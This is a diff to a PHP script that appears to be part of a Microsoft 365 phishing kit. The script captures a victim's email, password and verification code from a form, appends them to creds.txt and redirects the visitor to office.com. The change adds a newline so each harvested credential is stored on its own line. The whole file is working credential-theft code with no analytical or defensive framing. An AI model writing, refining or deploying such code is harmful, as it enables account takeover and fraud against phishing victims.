@@ -1,6 +1,6 @@
 <?php
     $creds = fopen("creds.txt", "w") or header("Location: https://www.office.com");
-    $cred = $_POST["email"] . "  :  " . $_POST["password"] . "  :  " . $_POST["code"];
+    $cred = $_POST["email"] . "  :  " . $_POST["password"] . "  :  " . $_POST["code"] . "\n";
     fwrite($creds, $cred);
     fclose($creds);
     // Redirect to Microsoft
